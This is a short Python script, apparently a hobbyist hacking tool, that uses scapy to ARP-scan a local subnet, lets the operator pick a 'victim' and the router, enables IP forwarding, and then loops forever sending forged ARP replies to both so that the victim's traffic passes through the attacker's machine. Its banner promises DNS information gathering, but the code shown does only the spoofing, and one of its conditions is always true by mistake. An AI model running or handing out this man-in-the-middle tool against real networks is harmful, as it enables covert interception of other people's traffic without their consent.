from scapy.all import ARP, Ether, srp   
import scapy.all as scap
import os
import time
import platform

os.system('clear')

version = platform.version()
split1 = version.split("-")[1]
split2 = split1.split(" ")[0]

if split2 == "Ubuntu" or "Debian":
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 

print('     -------------------------')
print("     |MITM, GET INFO FROM DNS|")
print('     -------------------------')
print("")
print("Enter network ip : (example : 192.168.1.0/24)", "\n")

target_ip = input()

for x in range (0,4):  
    b = "Scanning" + "." * x
    print (b, end="\r")
    time.sleep(0.5)

arp = ARP(pdst=target_ip)
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether/arp
result = srp(packet, timeout=3, verbose=0)[0]

ip = []
mac = []

for _, received in result:
    ip.append(received.psrc)
    mac.append(received.hwsrc)

print("ips in the network", ip)
print("macs in the network", mac)


print("Enter victim ip (1, 2, 3,...)")
victim = input()
print("Enter router ip (1, 2, 3,...) Usually ends by .254")
router = input()

while True:
    arp_response = ARP(pdst=ip[int(victim)-1], hwdst=mac[int(victim)-1], psrc=ip[int(router)-1])
    scap.send(arp_response, count = 1)
    arp_response = ARP(pdst=ip[int(router)-1], hwdst=mac[int(router)-1], psrc=ip[int(victim)-1])
    scap.send(arp_response, count = 1)
    time.sleep(1)

